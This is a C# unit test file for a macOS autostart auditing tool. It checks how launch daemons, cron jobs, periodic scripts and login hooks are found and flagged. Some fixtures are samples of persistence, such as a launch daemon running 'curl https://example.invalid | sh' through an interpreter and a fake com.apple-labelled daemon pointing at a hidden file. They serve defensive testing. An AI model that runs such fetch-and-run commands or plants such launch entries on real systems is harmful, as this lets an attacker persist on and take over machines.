using System.Collections;
using System.Security;
using MacDiag.Mcp.Configuration;
using MacDiag.Mcp.Diagnostics.Autostart;
using MacDiag.Mcp.Tools;
using static MacDiag.Mcp.Tests.StatLinesTests;

namespace MacDiag.Mcp.Tests;

public sealed class AutostartTests
{
    internal const string AgentD = "/Library/LaunchDaemons/com.example.agentd.plist";
    internal const string AgentDProgram = "/Library/Application Support/Example/agentd";
    internal const string Syslogd = "/System/Library/LaunchDaemons/com.apple.syslogd.plist";

    /// <summary>A launchd plist as plutil -convert xml1 prints it.</summary>
    internal static string Plist(string label, string[] arguments, string extra = "<key>RunAtLoad</key><true/>") =>
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
        "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n" +
        $"<plist version=\"1.0\"><dict><key>Label</key><string>{SecurityElement.Escape(label)}</string>" +
        $"<key>ProgramArguments</key><array>{string.Concat(arguments.Select(a => $"<string>{SecurityElement.Escape(a)}</string>"))}</array>{extra}</dict></plist>\n";

    /// <summary>A Mac made of plists, text files, stat lines and launchctl answers; every program call is recorded.</summary>
    internal sealed class FakeMac
    {
        public Dictionary<string, string> Plists { get; } = new()
        {
            [AgentD] = Plist("com.example.agentd", [AgentDProgram, "--daemon"]),
            [Syslogd] = Plist("com.apple.syslogd", ["/usr/sbin/syslogd"]),
        };

        public Dictionary<string, string> Texts { get; } = [];

        public Dictionary<string, string> Stats { get; } = new()
        {
            [AgentD] = Line(AgentD, 0, 0, "0644", "Regular File"),
            [AgentDProgram] = Line(AgentDProgram, 0, 0, "0755", "Regular File"),
            ["/Library/LaunchDaemons"] = Line("/Library/LaunchDaemons", 0, 0, "0755", "Directory"),
            [Syslogd] = Line(Syslogd, 0, 0, "0644", "Regular File"),
            ["/usr/sbin/syslogd"] = Line("/usr/sbin/syslogd", 0, 0, "0755", "Regular File"),
        };

        /// <summary>Directories with no file of their own in the maps above: app bundles and plugin bundles.</summary>
        public HashSet<string> Directories { get; } = [];

        public Dictionary<string, string> Disabled { get; } = [];

        public Dictionary<string, int> Uids { get; } = new() { ["root"] = 0, ["alice"] = 501, ["_www"] = 70 };

        public HashSet<string> Unsigned { get; } = [];

        public HashSet<string> AppleSigned { get; } = ["/usr/sbin/syslogd"];

        public HashSet<string> Unreadable { get; } = [];

        /// <summary>Paths plutil or codesign never finishes on, and programs that hang outright.</summary>
        public HashSet<string> Hangs { get; } = [];

        public Dictionary<string, string> Links { get; } = [];

        /// <summary>Paths stat reports as Permission denied, and links this process may not follow.</summary>
        public HashSet<string> Denied { get; } = [];

        public string[] Homes { get; set; } = [];

        public ExternalResult SystemExtensions { get; set; } = FakeCommands.Ok("0 extension(s)\n");

        public ExternalResult Kexts { get; set; } = FakeCommands.Ok("Index Refs Address            Size       Wired      Name (Version) UUID <Linked Against>\n");

        public ExternalResult Btm { get; set; } = FakeCommands.Ok("");

        public bool Root { get; set; } = true;

        public FakeCommands Commands { get; private set; } = null!;

        public MacAutostartInspector Inspector()
        {
            Commands = new FakeCommands(Answer);
            var all = Plists.Keys.Concat(Texts.Keys).Concat(Stats.Keys).Concat(Directories).Distinct().ToList();
            return new MacAutostartInspector(Commands, MacDiagOptions.FromEnvironment(new Hashtable()), new Probe(Root))
            {
                ListHomes = () => Homes,
                ListEntries = directory => all.Where(p => p.StartsWith(directory + "/", StringComparison.Ordinal) && !p[(directory.Length + 1)..].Contains('/')),
                FileExists = path => all.Contains(path),
                ReadText = path => Unreadable.Contains(path) ? throw new UnauthorizedAccessException(path) : Texts.GetValueOrDefault(path),
                Resolve = path => Denied.Contains(path) ? throw new UnauthorizedAccessException(path) : Links.TryGetValue(path, out var target) ? target : path,
            };
        }

        private ExternalResult Answer(string program, IReadOnlyList<string> args) => (program, args.FirstOrDefault()) switch
        {
            _ when Hangs.Contains(program) || (program is "plutil" or "codesign" && Hangs.Contains(args[^1])) => FakeCommands.Hang(program),
            ("plutil", "-convert") when Unreadable.Contains(args[^1]) => new ExternalResult(1, "", $"{args[^1]}: Permission denied"),
            ("plutil", "-convert") => Plists.TryGetValue(args[^1], out var xml) ? FakeCommands.Ok(xml) : new ExternalResult(1, "", "no such file"),
            ("stat", _) => StatLinesTests.Answer(Stats, args, Denied),
            ("launchctl", "print-disabled") => FakeCommands.Ok(Disabled.GetValueOrDefault(args[1], "disabled services = {\n}\n")),
            ("id", "-u") => Uids.TryGetValue(args[^1], out var uid) ? FakeCommands.Ok($"{uid}\n") : new ExternalResult(1, "", "id: no such user"),
            ("codesign", "--verify") => Unsigned.Contains(args[^1]) ? new ExternalResult(1, "", $"{args[^1]}: code object is not signed at all") : new ExternalResult(0, "", ""),
            ("codesign", "-dvvv") => new ExternalResult(0, "", AppleSigned.Contains(args[^1]) ? "Authority=Software Signing\n" : "Authority=Developer ID Application: Example (ABCDE12345)\n"),
            ("systemextensionsctl", "list") => SystemExtensions,
            ("kmutil", "showloaded") => Kexts,
            ("sfltool", "dumpbtm") => Btm,
            _ => new ExternalResult(1, "", $"unexpected {program} {string.Join(' ', args)}"),
        };
    }

    private sealed class Probe(bool root) : IPrivilegeProbe
    {
        public bool IsElevated => root;
    }

    private static Task<AutostartAuditResult> Audit(FakeMac mac, AutostartQuery? query = null) =>
        mac.Inspector().AuditAsync(query ?? new AutostartQuery(), CancellationToken.None);

    [Fact]
    public async Task A_daemon_plist_becomes_an_entry_with_its_program_launch_string_and_triggers()
    {
        var entry = (await Audit(new FakeMac())).Entries.Single();

        Assert.Equal(("daemons", AgentD, "com.example.agentd", true), (entry.Category, entry.Location, entry.Entry, entry.Enabled));
        Assert.Equal(AgentDProgram, entry.ImagePath);
        Assert.Equal($"{AgentDProgram} --daemon", entry.LaunchString);
        Assert.Contains("at load", entry.Description, StringComparison.Ordinal);
        Assert.False(entry.WritableByOthers);
        Assert.False(entry.ImageMissing);
    }

    [Fact]
    public async Task Apples_daemons_on_the_sealed_volume_are_hidden_by_default_without_being_read()
    {
        var mac = new FakeMac();

        var hidden = await Audit(mac);
        Assert.DoesNotContain(mac.Commands.Calls, c => c.Arguments.Contains(Syslogd));
        Assert.DoesNotContain(hidden.Entries, e => e.Entry == "com.apple.syslogd");

        var shown = await Audit(mac, new AutostartQuery(HideApple: false));
        Assert.Contains(shown.Entries, e => e.Entry == "com.apple.syslogd");
    }

    [Fact]
    public async Task A_plist_in_Library_calling_itself_com_apple_is_shown_because_whoever_wrote_it_chose_the_label()
    {
        var mac = new FakeMac();
        const string Planted = "/Library/LaunchDaemons/com.apple.updater.plist";
        mac.Plists[Planted] = Plist("com.apple.updater", ["/Users/Shared/.u"]);
        mac.Stats[Planted] = Line(Planted, 0, 0, "0644", "Regular File");

        var result = await Audit(mac);

        Assert.Contains(result.Entries, e => e.Entry == "com.apple.updater");
    }

    [Fact]
    public async Task An_apple_signed_program_run_from_a_plist_outside_the_sealed_volume_is_still_shown()
    {
        // Apple's programs can be pointed at anything (curl, osascript, launchctl): the program's signer says
        // nothing about who configured the job, so only the sealed volume hides an entry.
        var mac = new FakeMac();
        const string AppleTool = "/Library/LaunchDaemons/com.apple.thing.plist";
        mac.Plists[AppleTool] = Plist("com.apple.thing", ["/usr/bin/curl", "-o", "/tmp/x", "https://example.invalid/x"]);
        mac.Stats[AppleTool] = Line(AppleTool, 0, 0, "0644", "Regular File");
        mac.Stats["/usr/bin/curl"] = Line("/usr/bin/curl", 0, 0, "0755", "Regular File");
        mac.AppleSigned.Add("/usr/bin/curl");

        var result = await Audit(mac, new AutostartQuery(VerifySignatures: true));

        var entry = result.Entries.Single(e => e.Entry == "com.apple.thing");
        Assert.Equal((true, "Signed by Apple"), (entry.Signed, entry.SignatureDetail));
    }

    [Theory]
    [InlineData("/bin/sh", "-c")]
    [InlineData("/usr/bin/osascript", "-e")]
    [InlineData("/usr/bin/python3", "-c")]
    [InlineData("/usr/bin/env", "python3")]
    public async Task An_interpreter_running_inline_code_counts_as_unsigned_whatever_signed_the_interpreter(string interpreter, string flag)
    {
        var mac = new FakeMac();
        const string Inline = "/Library/LaunchDaemons/com.example.inline.plist";
        mac.Plists[Inline] = Plist("com.example.inline", [interpreter, flag, "curl https://example.invalid | sh"]);
        mac.Stats[Inline] = Line(Inline, 0, 0, "0644", "Regular File");
        mac.Stats[interpreter] = Line(interpreter, 0, 0, "0755", "Regular File");
        mac.AppleSigned.Add(interpreter);

        var result = await Audit(mac, new AutostartQuery(UnsignedOnly: true));

        var entry = result.Entries.Single(e => e.Entry == "com.example.inline");
        Assert.False(entry.Signed);
        Assert.Contains("interpreter", entry.SignatureDetail, StringComparison.Ordinal);
    }

    [Fact]
    public async Task A_plist_that_is_not_a_regular_file_is_never_handed_to_plutil_and_is_flagged()
    {
        var mac = new FakeMac { Homes = ["/Users/alice"] };
        const string Fifo = "/Users/alice/Library/LaunchAgents/x.plist";
        mac.Plists[Fifo] = Plist("x", ["/bin/true"]);
        mac.Stats["/Users/alice"] = Line("/Users/alice", 501, 20, "0750", "Directory");
        mac.Stats[Fifo] = Line(Fifo, 501, 20, "0644", "Fifo File");

        var result = await Audit(mac, new AutostartQuery("useragents"));

        Assert.DoesNotContain(mac.Commands.Calls, c => c.Program == "plutil" && c.Arguments.Contains(Fifo));
        var entry = result.Entries.Single(e => e.Location == Fifo);
        Assert.True(entry.WritableByOthers);
        Assert.Contains(entry.Findings, f => f.Contains("not a regular file", StringComparison.Ordinal));
    }

    [Fact]
    public async Task A_plist_linked_to_a_device_is_never_handed_to_plutil()
    {
        var mac = new FakeMac();
        const string Linked = "/Library/LaunchDaemons/com.example.zero.plist";
        mac.Plists[Linked] = Plist("com.example.zero", ["/bin/true"]);
        mac.Stats[Linked] = Line(Linked, 0, 0, "0755", "Symbolic Link");
        mac.Stats["/dev/zero"] = Line("/dev/zero", 0, 0, "0666", "Character Device");
        mac.Links[Linked] = "/dev/zero";

        var result = await Audit(mac);

        Assert.DoesNotContain(mac.Commands.Calls, c => c.Program == "plutil" && (c.Arguments.Contains(Linked) || c.Arguments.Contains("/dev/zero")));
        Assert.Contains(result.Entries, e => e.Location == Linked && e.WritableByOthers);
    }

    [Fact]
    public async Task A_plist_linked_to_a_regular_file_is_read_where_it_leads()
    {
        var mac = new FakeMac();
        const string Linked = "/Library/LaunchDaemons/com.example.linked.plist";
        const string Target = "/Library/Example/com.example.linked.plist";
        mac.Plists[Target] = Plist("com.example.linked", [AgentDProgram]);
        mac.Stats[Linked] = Line(Linked, 0, 0, "0755", "Symbolic Link");
        mac.Stats[Target] = Line(Target, 0, 0, "0644", "Regular File");
        mac.Directories.Add(Linked);
        mac.Links[Linked] = Target;

        var result = await Audit(mac);

        Assert.Contains(result.Entries, e => e.Entry == "com.example.linked" && e.Location == Linked);
    }

    [Fact]
    public async Task A_plist_plutil_never_finishes_on_is_unreadable_and_the_audit_still_returns()
    {
        var mac = new FakeMac();
        mac.Hangs.Add(AgentD);

        var result = await Audit(mac);

        Assert.Empty(result.Entries);
        Assert.Contains(result.Limitations, l => l.Contains("plutil did not finish", StringComparison.Ordinal));
    }

    [Fact]
    public async Task A_program_codesign_never_finishes_on_is_reported_as_not_judged_and_kept_by_unsigned_only()
    {
        var mac = new FakeMac();
        mac.Hangs.Add(AgentDProgram);

        var entry = (await Audit(mac, new AutostartQuery(UnsignedOnly: true))).Entries.Single();

        Assert.Null(entry.Signed);
        Assert.Contains("did not finish", entry.SignatureDetail, StringComparison.Ordinal);
    }

    [Fact]
    public async Task A_listing_command_that_hangs_is_a_named_limitation_not_a_failed_audit()
    {
        var mac = new FakeMac();
        mac.Hangs.Add("kmutil");

        var result = await Audit(mac, new AutostartQuery("daemons,kext"));

        Assert.Single(result.Entries);
        Assert.Contains(result.Limitations, l => l.Contains("kmutil showloaded", StringComparison.Ordinal));
    }

    [Fact]
    public async Task A_symlinked_periodic_script_is_judged_where_it_leads_because_periodic_runs_it()
    {
        var mac = new FakeMac();
        const string Script = "/usr/local/etc/periodic/daily/600.sync";
        const string Target = "/usr/local/Cellar/sync/bin/sync.sh";
        mac.Stats[Script] = Line(Script, 501, 20, "0755", "Symbolic Link");
        mac.Stats[Target] = Line(Target, 501, 20, "0755", "Regular File");
        mac.Links[Script] = Target;

        var entry = (await Audit(mac, new AutostartQuery("periodic"))).Entries.Single();

        Assert.Equal("600.sync", entry.Entry);
        Assert.True(entry.WritableByOthers);
    }

    [Fact]
    public async Task A_periodic_script_whose_name_has_a_control_character_is_flagged_not_dropped()
    {
        var mac = new FakeMac();
        mac.Directories.Add("/etc/periodic/daily/x\ny");

        var entry = (await Audit(mac, new AutostartQuery("periodic"))).Entries.Single();

        Assert.True(entry.WritableByOthers);
        Assert.Contains(entry.Findings, f => f.Contains("control character", StringComparison.Ordinal));
    }

    [Fact]
    public async Task A_program_stat_may_not_look_at_is_reported_as_unexamined_not_missing()
    {
        var mac = new FakeMac();
        mac.Stats.Remove(AgentDProgram);
        mac.Denied.Add(AgentDProgram);

        var entry = (await Audit(mac)).Entries.Single();

        Assert.False(entry.ImageMissing);
        Assert.Contains(entry.Findings, f => f.Contains("permission denied", StringComparison.Ordinal));
        Assert.DoesNotContain(entry.Findings, f => f.Contains("does not exist", StringComparison.Ordinal));
    }

    [Fact]
    public async Task A_link_this_server_may_not_follow_costs_nothing_but_its_resolved_spelling()
    {
        var mac = new FakeMac();
        mac.Denied.Add(AgentDProgram);

        var entry = (await Audit(mac)).Entries.Single();

        Assert.Equal(AgentDProgram, entry.ImagePath);
    }

    [Fact]
    public async Task Without_root_other_users_launch_agents_are_named_as_possibly_missing()
    {
        var mac = new FakeMac { Root = false, Homes = ["/Users/alice"] };

        var result = await Audit(mac, new AutostartQuery("useragents"));

        Assert.Contains(result.Limitations, l => l.Contains("LaunchAgents", StringComparison.Ordinal));
    }

    [Fact]
    public async Task A_launchd_override_wins_over_the_plists_disabled_key()
    {
        var mac = new FakeMac();
        mac.Plists[AgentD] = Plist("com.example.agentd", [AgentDProgram], "<key>Disabled</key><true/>");
        Assert.False((await Audit(mac)).Entries.Single().Enabled);

        mac.Disabled["system"] = "disabled services = {\n\t\"com.example.agentd\" => enabled\n}\n";
        Assert.True((await Audit(mac)).Entries.Single().Enabled);
    }

    [Fact]
    public async Task A_daemon_plist_another_account_owns_is_flagged_with_the_reason()
    {
        var mac = new FakeMac();
        mac.Stats[AgentD] = Line(AgentD, 501, 20, "0644", "Regular File");

        var entry = (await Audit(mac)).Entries.Single();

        Assert.True(entry.WritableByOthers);
        Assert.Contains(entry.Findings, f => f.Contains(AgentD, StringComparison.Ordinal) && f.Contains("uid 501", StringComparison.Ordinal));
    }

    [Fact]
    public async Task A_program_in_a_directory_staff_can_write_is_flagged_because_it_could_be_replaced()
    {
        var mac = new FakeMac();
        mac.Stats["/Library/Application Support/Example"] = Line("/Library/Application Support/Example", 0, 20, "0775", "Directory");

        var entry = (await Audit(mac)).Entries.Single();

        Assert.True(entry.WritableByOthers);
        Assert.Contains(entry.Findings, f => f.Contains("/Library/Application Support/Example ", StringComparison.Ordinal));
    }

    [Fact]
    public async Task A_daemon_running_as_its_UserName_may_own_its_program()
    {
        var mac = new FakeMac();
        mac.Plists[AgentD] = Plist("com.example.agentd", [AgentDProgram], "<key>UserName</key><string>alice</string>");
        mac.Stats[AgentDProgram] = Line(AgentDProgram, 501, 20, "0755", "Regular File");

        Assert.False((await Audit(mac)).Entries.Single().WritableByOthers);

        mac.Plists[AgentD] = Plist("com.example.agentd", [AgentDProgram]);
        Assert.True((await Audit(mac)).Entries.Single().WritableByOthers);
    }

    [Fact]
    public async Task An_agent_from_a_drag_installed_app_owned_by_a_user_and_writable_by_admin_is_not_flagged()
    {
        var mac = new FakeMac();
        const string Agent = "/Library/LaunchAgents/com.example.helper.plist";
        const string Binary = "/Applications/Example.app/Contents/MacOS/helper";
        mac.Plists[Agent] = Plist("com.example.helper", [Binary]);
        mac.Stats[Agent] = Line(Agent, 0, 0, "0644", "Regular File");
        mac.Stats["/Applications"] = Line("/Applications", 0, 80, "0775", "Directory");
        mac.Stats["/Applications/Example.app"] = Line("/Applications/Example.app", 501, 80, "0775", "Directory");
        mac.Stats[Binary] = Line(Binary, 501, 80, "0775", "Regular File");

        var entry = (await Audit(mac, new AutostartQuery("agents"))).Entries.Single();

        Assert.Equal("agents", entry.Category);
        Assert.False(entry.WritableByOthers);
    }

    [Fact]
    public async Task A_program_that_does_not_exist_is_reported_missing()
    {
        var mac = new FakeMac();
        mac.Stats.Remove(AgentDProgram);

        var result = await Audit(mac);

        Assert.True(result.Entries.Single().ImageMissing);
        Assert.Equal(1, result.MissingImageCount);
    }

    [Fact]
    public async Task A_users_launch_agents_belong_to_that_user_and_their_own_files_are_not_flagged()
    {
        var mac = new FakeMac { Homes = ["/Users/alice"] };
        const string Agent = "/Users/alice/Library/LaunchAgents/com.example.sync.plist";
        mac.Plists[Agent] = Plist("com.example.sync", ["/Users/alice/bin/sync"]);
        mac.Stats["/Users/alice"] = Line("/Users/alice", 501, 20, "0750", "Directory");
        mac.Stats[Agent] = Line(Agent, 501, 20, "0644", "Regular File");
        mac.Stats["/Users/alice/bin/sync"] = Line("/Users/alice/bin/sync", 501, 20, "0755", "Regular File");

        var entry = (await Audit(mac, new AutostartQuery("useragents"))).Entries.Single();

        Assert.Equal(("useragents", "alice"), (entry.Category, entry.Profile));
        Assert.False(entry.WritableByOthers);
    }

    [Fact]
    public async Task The_system_crontab_skips_comments_and_settings_and_reads_its_user_field()
    {
        var mac = new FakeMac();
        mac.Texts["/etc/crontab"] = "# m h dom mon dow user command\nSHELL=/bin/sh\n\n*/5 * * * * root /usr/local/bin/backup --all\n@reboot root /bin/sh /usr/local/scripts/boot.sh\n";
        mac.Stats["/etc/crontab"] = Line("/etc/crontab", 0, 0, "0644", "Regular File");
        mac.Stats["/usr/local/bin/backup"] = Line("/usr/local/bin/backup", 0, 0, "0755", "Regular File");
        mac.Stats["/bin/sh"] = Line("/bin/sh", 0, 0, "0755", "Regular File");
        mac.Stats["/usr/local/scripts/boot.sh"] = Line("/usr/local/scripts/boot.sh", 0, 0, "0755", "Regular File");

        var entries = (await Audit(mac, new AutostartQuery("cron"))).Entries;

        Assert.Equal(2, entries.Count);
        var backup = entries.Single(e => e.ImagePath == "/usr/local/bin/backup");
        Assert.Equal(("root", "/usr/local/bin/backup --all"), (backup.Profile, backup.LaunchString));
        var boot = entries.Single(e => e.ImagePath == "/bin/sh");
        Assert.Equal("/usr/local/scripts/boot.sh", boot.ScriptPath);
    }

    [Fact]
    public async Task A_users_crontab_is_read_as_root_and_named_as_missing_otherwise()
    {
        var mac = new FakeMac();
        mac.Texts["/usr/lib/cron/tabs/alice"] = "0 * * * * /Users/alice/bin/sync\n";
        mac.Stats["/usr/lib/cron/tabs/alice"] = Line("/usr/lib/cron/tabs/alice", 0, 0, "0600", "Regular File");

        var entry = (await Audit(mac, new AutostartQuery("cron"))).Entries.Single();
        Assert.Equal(("alice", "/Users/alice/bin/sync"), (entry.Profile, entry.ImagePath));

        mac.Root = false;
        var partial = await Audit(mac, new AutostartQuery("cron"));
        Assert.Empty(partial.Entries);
        Assert.False(partial.Elevated);
        Assert.Contains(partial.Limitations, l => l.Contains("/usr/lib/cron/tabs", StringComparison.Ordinal));
    }

    [Fact]
    public async Task A_periodic_script_anyone_can_write_is_flagged()
    {
        var mac = new FakeMac();
        const string Script = "/usr/local/etc/periodic/daily/500.cleanup";
        mac.Stats[Script] = Line(Script, 0, 0, "0777", "Regular File");

        var entry = (await Audit(mac, new AutostartQuery("periodic"))).Entries.Single();

        Assert.Equal(("periodic", "500.cleanup", Script), (entry.Category, entry.Entry, entry.ImagePath));
        Assert.True(entry.WritableByOthers);
    }

    [Fact]
    public async Task A_non_executable_file_in_a_periodic_directory_is_not_run_and_not_listed()
    {
        var mac = new FakeMac();
        const string Readme = "/etc/periodic/daily/README";
        mac.Stats[Readme] = Line(Readme, 0, 0, "0644", "Regular File");

        Assert.Empty((await Audit(mac, new AutostartQuery("periodic"))).Entries);
    }

    [Fact]
    public async Task A_login_hook_names_the_script_it_runs()
    {
        var mac = new FakeMac();
        const string Prefs = "/Library/Preferences/com.apple.loginwindow.plist";
        mac.Plists[Prefs] = "<?xml version=\"1.0\"?><plist version=\"1.0\"><dict><key>LoginHook</key><string>/usr/local/bin/hook.sh</string></dict></plist>";
        mac.Stats[Prefs] = Line(Prefs, 0, 0, "0644", "Regular File");
        mac.Stats["/usr/local/bin/hook.sh"] = Line("/usr/local/bin/hook.sh", 0, 0, "0755", "Regular File");

        var entry = (await Audit(mac, new AutostartQuery("loginhooks"))).Entries.Single();

        Assert.Equal(("loginhooks", "LoginHook", "/usr/local/bin/hook.sh"), (entry.Category, entry.Entry, entry.ImagePath));
    }

    [Fact]
    public async Task An_authorization_plugin_bundle_is_listed()
    {
        var mac = new FakeMac();
        const string Bundle = "/Library/Security/SecurityAgentPlugins/Example.bundle";
        mac.Stats[Bundle] = Line(Bundle, 0, 0, "0755", "Directory");

        var entry = (await Audit(mac, new AutostartQuery("authplugins"))).Entries.Single();

        Assert.Equal(("authplugins", "Example.bundle", Bundle), (entry.Category, entry.Entry, entry.ImagePath));
    }

    [Fact]
    public async Task Unsigned_only_keeps_unsigned_programs_scripts_and_files_others_can_write()
    {
        var mac = new FakeMac();
        const string Unsigned = "/Library/LaunchDaemons/com.example.unsigned.plist";
        const string Script = "/Library/LaunchDaemons/com.example.script.plist";
        const string Writable = "/Library/LaunchDaemons/com.example.writable.plist";
        mac.Plists[Unsigned] = Plist("com.example.unsigned", ["/usr/local/bin/u"]);
        mac.Plists[Script] = Plist("com.example.script", ["/bin/bash", "-c", "/usr/local/bin/run.sh"]);
        mac.Plists[Writable] = Plist("com.example.writable", [AgentDProgram]);
        mac.Stats[Unsigned] = Line(Unsigned, 0, 0, "0644", "Regular File");
        mac.Stats[Script] = Line(Script, 0, 0, "0644", "Regular File");
        mac.Stats[Writable] = Line(Writable, 0, 0, "0666", "Regular File");
        mac.Stats["/usr/local/bin/u"] = Line("/usr/local/bin/u", 0, 0, "0755", "Regular File");
        mac.Stats["/bin/bash"] = Line("/bin/bash", 0, 0, "0755", "Regular File");
        mac.Stats["/usr/local/bin/run.sh"] = Line("/usr/local/bin/run.sh", 0, 0, "0755", "Regular File");
        mac.Unsigned.Add("/usr/local/bin/u");

        var result = await Audit(mac, new AutostartQuery(UnsignedOnly: true));

        Assert.Equal(["com.example.script", "com.example.unsigned", "com.example.writable"], result.Entries.Select(e => e.Entry));
        Assert.True(result.SignaturesVerified);
        var script = result.Entries.Single(e => e.Entry == "com.example.script");
        Assert.Equal(("/usr/local/bin/run.sh", false), (script.ScriptPath, script.Signed));
    }

    [Fact]
    public async Task A_name_filter_matches_label_program_location_or_command()
    {
        var mac = new FakeMac();

        Assert.Single((await Audit(mac, new AutostartQuery(NameFilter: "APPLICATION SUPPORT"))).Entries);
        Assert.Empty((await Audit(mac, new AutostartQuery(NameFilter: "nothing-like-it"))).Entries);
    }

    [Fact]
    public async Task An_unknown_category_is_refused_naming_the_valid_ones()
    {
        var error = await Assert.ThrowsAsync<ArgumentException>(() => Audit(new FakeMac(), new AutostartQuery("daemons,bogus")));

        Assert.Contains("bogus", error.Message, StringComparison.Ordinal);
        Assert.Contains("useragents", error.Message, StringComparison.Ordinal);
    }

    [Fact]
    public async Task A_plist_plutil_cannot_read_is_a_limitation_not_a_failure()
    {
        var mac = new FakeMac();
        mac.Unreadable.Add(AgentD);

        var result = await Audit(mac);

        Assert.Empty(result.Entries);
        Assert.Contains(result.Limitations, l => l.Contains(AgentD, StringComparison.Ordinal));
    }

    [Fact]
    public async Task A_plist_whose_name_has_a_control_character_is_flagged_and_never_handed_to_a_program()
    {
        var mac = new FakeMac();
        const string Odd = "/Library/LaunchDaemons/com.x\n0\t0\t0644.plist";
        mac.Plists[Odd] = Plist("com.x", ["/bin/true"]);

        var result = await Audit(mac);

        Assert.DoesNotContain(mac.Commands.Calls.SelectMany(c => c.Arguments), a => a.Contains('\n', StringComparison.Ordinal));
        var entry = result.Entries.Single(e => e.Location == Odd);
        Assert.True(entry.WritableByOthers);
        Assert.Contains(entry.Findings, f => f.Contains("control character", StringComparison.Ordinal));
    }

    [Fact]
    public async Task Write_access_through_an_acl_is_always_named_as_unchecked()
    {
        Assert.Contains((await Audit(new FakeMac())).Limitations, l => l.Contains("ACL", StringComparison.Ordinal));
    }

    [Fact]
    public void The_summary_marks_entries_others_can_write_and_missing_programs()
    {
        var entry = new AutostartEntry("daemons", AgentD, "com.example.agentd", true, null, "at load", AgentDProgram, AgentDProgram, null,
            false, "Not signed", true, true, [$"{AgentD} is owned by uid 501, not root."]);
        var result = new AutostartAuditResult([entry], 1, false, true, true, 1, 1, 1, ["write access granted through an ACL is not checked."]);

        var summary = AutostartTools.Render(result, "all", null);

        Assert.Contains("[FILE NOT FOUND]", summary, StringComparison.Ordinal);
        Assert.Contains("[UNSIGNED]", summary, StringComparison.Ordinal);
        Assert.Contains("! /Library/LaunchDaemons/com.example.agentd.plist is owned by uid 501", summary, StringComparison.Ordinal);
    }
}
